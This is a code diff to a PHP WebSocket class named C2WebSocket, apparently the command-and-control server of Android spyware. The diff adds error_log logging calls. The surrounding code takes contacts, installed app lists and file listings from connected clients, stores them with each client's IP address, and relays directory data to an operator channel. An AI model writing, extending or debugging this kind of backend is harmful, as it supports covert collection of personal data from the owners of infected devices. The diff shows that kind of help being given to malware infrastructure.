@@ -26,6 +26,8 @@ class C2WebSocket implements MessageComponentInterface {
     public function onOpen(ConnectionInterface $conn)
     {
         $this->clients->attach($conn);
+        error_log("Connection established with client {$conn->resourceId}");
+
         if (isset($this->server)) {
             $currentDateTime = date('Y-m-d H:i:s');
             $response = [
@@ -33,12 +35,16 @@ class C2WebSocket implements MessageComponentInterface {
                 "message" => "[" . $currentDateTime . "]: Connection estbalished by " . $conn->resourceId
             ];
             $this->server->send(json_encode($response));
+            error_log("Sent connection established message to server: " . json_encode($response));
         }
     }
 
     public function onMessage(ConnectionInterface $conn, MessageInterface $msg)
     {
         $data = json_decode($msg->getPayload());
+
+        // Log the received message
+        error_log("Received message from connection {$conn->resourceId}: " . $msg->getPayload());
 
         if ($data === null)
             return;
@@ -52,6 +58,9 @@ class C2WebSocket implements MessageComponentInterface {
                     "message" => "[" .$currentDateTime . "]: Connection established successfully " . $conn->resourceId
                 ];
                 $conn->send(json_encode($response));
+
+                // Log the sent response
+                error_log("Sent message to connection {$conn->resourceId}: " . json_encode($response));
             } else if ($data->type === "js-server-files") {
                 $this->jsServerFilesCommand($conn, $data);
             }  elseif ($data->type === 'client') {
@@ -70,12 +79,17 @@ class C2WebSocket implements MessageComponentInterface {
                 "message" => "[" .$currentDateTime . "]: $conn->resourceId => " . json_encode($data)
             ];
             $this->server->send(json_encode($response));
+
+            // Log the sent response
+            error_log("Sent message to server from connection {$conn->resourceId}: " . json_encode($response));
         }
     }
 
     public function onClose(ConnectionInterface $conn)
     {
         $this->clients->detach($conn);
+        error_log("Connection closed with client {$conn->resourceId}");
+
         if (isset($this->server)) {
             $currentDateTime = date('Y-m-d H:i:s');
             $response = [
@@ -83,6 +97,7 @@ class C2WebSocket implements MessageComponentInterface {
                 "message" => "[" .$currentDateTime . "]: Connection closed by " . $conn->resourceId
             ];
             $this->server->send(json_encode($response));
+            error_log("Sent connection closed message to server: " . json_encode($response));
         }
 
         if (isset($this->directoryCmdServer) && $conn === $this->directoryCmdServer)
@@ -91,6 +106,7 @@ class C2WebSocket implements MessageComponentInterface {
 
     public function onError(ConnectionInterface $conn, \Exception $e)
     {
+        error_log("Error on connection {$conn->resourceId}: " . $e->getMessage());
         $conn->close();
         print_r($e);
 
@@ -108,6 +124,9 @@ class C2WebSocket implements MessageComponentInterface {
     {
         $clientID = intval($data->id);
 
+        // Log client connection
+        error_log("Client connected with ID {$clientID} from IP {$conn->remoteAddress}");
+
         // Update user IP address
         $clientIP = $conn->remoteAddress;
         $query = "UPDATE CLIENT SET ip_address = ? WHERE id = ?";
@@ -120,6 +139,7 @@ class C2WebSocket implements MessageComponentInterface {
                     $query = "INSERT INTO INSTALLED_APP(client_id, package_name, app_name, timestamp) VALUES(?, ?, ?, ?)";
                     $this->database->insert($query, [$clientID, $packageName, $appName, $data->timestamp]);
                 }
+                error_log("App list updated for client {$clientID}");
                 break;
             case "contact":
                 $contacts = json_decode($data->contacts);
@@ -127,6 +147,7 @@ class C2WebSocket implements MessageComponentInterface {
                     $query = "INSERT INTO CONTACT(client_id, name, number) VALUES(?, ?, ?)";
                     $this->database->insert($query, [$clientID, $name, $number]);
                 }
+                error_log("Contacts updated for client {$clientID}");
                 break;
             case "files":
                 $files = $data->data;
@@ -137,6 +158,9 @@ class C2WebSocket implements MessageComponentInterface {
                         "message" => "[" .$currentDateTime . "]: $conn->resourceId => " . json_encode($files)
                     ];
                     $this->directoryCmdServer->send(json_encode($response));
+
+                    // Log the sent message
+                    error_log("Sent files data to directoryCmdServer from connection {$conn->resourceId}: " . json_encode($response));
                 }
                 break;
             case "id":
